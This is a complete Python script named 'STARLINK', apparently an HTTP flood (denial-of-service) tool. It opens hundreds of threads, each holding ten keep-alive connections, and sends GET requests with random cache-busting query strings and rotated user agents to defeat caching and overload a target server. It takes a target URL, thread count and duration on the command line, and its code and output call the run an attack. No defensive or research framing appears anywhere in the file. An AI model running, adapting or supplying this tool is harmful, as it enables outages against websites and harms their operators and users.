#!/usr/bin/env python3
"""
STARLINK - High RPS Cache Buster
"""

import socket
import ssl
import time
import random
import string
import threading
from datetime import datetime
from colorama import init, Fore, Style
import concurrent.futures

init(autoreset=True)

# Colors
CYAN = Fore.CYAN
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
RESET = Style.RESET_ALL

class StarLink:
    def __init__(self, target, threads=500, duration=60):
        self.target = target.replace('https://', '').replace('http://', '').split('/')[0]
        self.path = '/' + '/'.join(target.replace('https://', '').replace('http://', '').split('/')[1:]) if '/' in target else '/'
        self.threads = threads
        self.duration = duration
        self.running = True
        self.request_count = 0
        self.start_time = datetime.now()
        self.lock = threading.Lock()
        
        # Pre-generated cache busters (speed optimization)
        self.cache_busters = [f"?cache={i}" for i in range(1000, 9999)]
        self.cache_busters += [f"?v={i}" for i in range(1, 1000)]
        self.cache_busters += [f"?cb={random.randint(10000,99999)}" for _ in range(1000)]
        
        # Pre-generated user agents
        self.agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
        ]
        
        # Pre-built request templates (speed optimization)
        self.request_templates = []
        for agent in self.agents:
            req = f"GET {self.path} CACHEBUSTER {random.choice(['HTTP/1.0', 'HTTP/1.1'])}\r\n"
            req += f"Host: {self.target}\r\n"
            req += f"User-Agent: {agent}\r\n"
            req += "Accept: */*\r\n"
            req += "Accept-Language: en-US\r\n"
            req += "Connection: keep-alive\r\n"
            req += "Cache-Control: no-cache\r\n"
            req += "Pragma: no-cache\r\n"
            req += "\r\n"
            self.request_templates.append(req)
        
        print(f"\n{CYAN}STARLINK High RPS Mode{RESET}")
        print(f"Target: {target}")
        print(f"Threads: {threads}")
        print(f"Duration: {duration}s")
        print("=" * 60)
        
    def build_request(self):
        """Fast request builder"""
        template = random.choice(self.request_templates)
        cache_buster = random.choice(self.cache_busters)
        return template.replace('CACHEBUSTER', cache_buster).encode()
    
    def attack_worker(self):
        """Single worker - keeps connections alive"""
        # Pre-create socket
        host = self.target.split(':')[0]
        port = 443 if 'https' in str(self.target) or ':443' in str(self.target) else 80
        
        # Keep connection pool
        sockets = []
        for _ in range(10):  # 10 connections per thread
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                sock.connect((host, port))
                sockets.append(sock)
            except:
                continue
        
        if not sockets:
            return
        
        # Attack loop
        sock_index = 0
        while self.running:
            try:
                # Round-robin sockets
                sock = sockets[sock_index % len(sockets)]
                sock_index += 1
                
                # Send request
                request = self.build_request()
                sock.send(request)
                
                # Try to read response (non-blocking)
                try:
                    sock.recv(4096)
                except:
                    # Reconnect dead socket
                    try:
                        sock.close()
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.settimeout(2)
                        if port == 443:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            new_sock = context.wrap_socket(new_sock, server_hostname=host)
                        new_sock.connect((host, port))
                        sockets[sock_index % len(sockets)] = new_sock
                    except:
                        pass
                
                # Count request
                with self.lock:
                    self.request_count += 1
                
            except:
                pass
    
    def monitor(self):
        """Monitor and display stats"""
        last_count = 0
        while self.running:
            time.sleep(1)
            elapsed = (datetime.now() - self.start_time).seconds
            current = self.request_count
            rps = current - last_count
            last_count = current
            
            print(f"\r{CYAN}[{elapsed}s]{RESET} Requests: {current} | RPS: {rps} | Total: {rps*elapsed}", end='', flush=True)
            
            if elapsed >= self.duration:
                self.running = False
                break
    
    def start(self):
        """Start attack"""
        # Start threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Start monitor
        monitor = threading.Thread(target=self.monitor)
        monitor.daemon = True
        monitor.start()
        
        # Wait for duration
        time.sleep(self.duration + 1)
        
        # Summary
        elapsed = (datetime.now() - self.start_time).seconds
        print(f"\n\n{YELLOW}═══ Attack Complete ═══{RESET}")
        print(f"Total Requests: {self.request_count}")
        print(f"Average RPS: {self.request_count/elapsed:.1f}")
        print(f"Duration: {elapsed}s")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python starlink.py <target> [threads] [duration]")
        print("Example: python starlink.py https://example.com 1000 60")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 500
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    
    star = StarLink(target, threads, duration)
    star.start()
